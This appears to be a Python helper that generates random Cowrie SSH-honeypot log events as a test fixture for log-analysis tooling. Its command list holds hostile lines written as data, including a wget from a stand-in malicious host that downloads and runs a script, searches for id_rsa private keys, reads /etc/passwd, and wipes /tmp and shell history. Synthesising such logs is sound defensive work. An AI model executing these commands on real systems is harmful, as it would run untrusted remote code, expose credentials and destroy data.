import json
import random
from datetime import datetime, timezone, timedelta

ips = [
    "185.220.101.5", "45.154.255.19", "193.32.162.21", 
    "103.152.68.1", "91.240.118.25", "194.26.29.116", "213.202.219.10"
]

usernames = ["root", "admin", "user", "guest", "postgres", "test", "ubuntu"]
passwords = ["root123", "admin", "123456", "password", "toor", "changeme", "qwerty"]

commands = [
    "uname -a",
    "cat /etc/passwd",
    "cd /tmp && wget http://malicious-payload.sh/x.sh && chmod +x x.sh && ./x.sh",
    "netstat -antp",
    "ps aux",
    "curl -s http://ipinfo.io/json",
    "rm -rf /tmp/*",
    "find / -name id_rsa 2>/dev/null",
    "history -c",
    "envar"
]

event_types = [
    "cowrie.session.connect",
    "cowrie.login.failed",
    "cowrie.login.success",
    "cowrie.command.input",
    "cowrie.session.closed"
]

now = datetime.now(timezone.utc)
log_lines = []

# Generate a random count between 10 and 20 events
num_events = random.randint(10, 20)

for i in range(num_events):
    timestamp = now - timedelta(hours=random.randint(0, 24), minutes=random.randint(0, 59), seconds=random.randint(0, 59))
    session_id = f"{random.randint(10000, 99999):08x}"
    src_ip = random.choice(ips)
    eventid = random.choice(event_types)
    
    event = {
        "timestamp": timestamp.strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
        "epoch": timestamp.timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "eventid": eventid,
        "sensor": "honeypot-arch-sensor-01"
    }

    if "login" in eventid:
        event["username"] = random.choice(usernames)
        event["password"] = random.choice(passwords)
        event["message"] = f"Login attempt [{event['username']}/{event['password']}]"
        if eventid == "cowrie.login.success":
            event["message"] = f"Login succeeded [{event['username']}/{event['password']}]"
    elif eventid == "cowrie.command.input":
        cmd = random.choice(commands)
        event["input"] = cmd
        event["message"] = f"Command input: {cmd}"
    elif eventid == "cowrie.session.connect":
        event["message"] = f"New connection from {src_ip}:22"
    elif eventid == "cowrie.session.closed":
        event["message"] = f"Connection lost after {random.randint(5, 300)} seconds"

    log_lines.append(json.dumps(event))

# Save to the fixtures folder relative to the root
with open("tests/fixtures/varied_custom_logs.jsonl", "w") as f:
    f.write("\n".join(log_lines))

print(f"Successfully generated {num_events} random log events in tests/fixtures/varied_custom_logs.jsonl!")
